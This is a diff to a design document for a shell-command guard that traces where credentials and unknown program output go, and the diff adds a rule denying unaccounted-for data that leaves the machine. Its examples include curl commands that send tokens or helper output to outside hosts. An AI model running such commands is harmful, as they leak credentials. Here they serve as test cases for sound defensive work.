@@ -160,6 +160,8 @@ known, and is every flag it was given known? The answer is printed in the
 > **DENY** when sensitive data reached a slot that exposes it.
 > **DENY** when sensitive data *entered* a command — through an argument or
 > through stdin — that the knowledge base does not fully account for.
+> **DENY** when data *produced by* a program not in the knowledge base leaves
+> the machine.
 > Otherwise **ALLOW**.
 
 A gap only matters when data flows through it. `ls -lah --color=auto` has four
@@ -176,6 +178,40 @@ $ ./guard 'curl -Z "$TOKEN" https://x.com'  DENY
 Data a command *produces* does not count as entering it — `gh auth token`
 printing a credential is the command doing its job, and the analyzer goes on
 to trace where that credential lands.
+
+### Data of unknown origin
+
+The first two clauses both key on data the analyzer already identified as
+sensitive. That misses the case where the unaccounted-for program is at the
+*producing* end:
+
+```
+curl -s -H "other: Bearer $(mystery-tool)" https://api.example.com
+```
+
+Nothing sensitive *enters* `mystery-tool`, and `curl` is fully understood — so
+neither clause fires. But the output of a program nobody modelled is going
+into a `content` slot and onto the network. Not knowing what it is has never
+been evidence that it is safe.
+
+So unresolved data denies wherever it leaves the machine, and an auth slot
+does not exempt it. That exemption is earned by knowing the value is a
+credential used correctly; here neither half is known:
+
+```
+curl -H "Authorization: Bearer $(gh auth token)"   ALLOW  known credential, correct slot
+curl -H "Authorization: Bearer $(token-helper)"    DENY   unknown output, could be anything
+```
+
+The disk slot is deliberately excluded. Writing an unknown program's output to
+a local file is what ordinary commands do all day — `deadcode ./... > /tmp/out`
+is not exfiltration.
+
+On the CI corpus this clause costs almost nothing: it moved the deny rate from
+2.63% to 2.64%, nine invocations. What it caught is real —
+`TOKEN=$(curl -s "https://gcr.io/v2/token?..." | python3 -c "...")` feeding a
+`curl -H`, where the value's provenance runs through a `python3 -c` script the
+analyzer cannot read.
 
 ### Arity is separate from slot
 
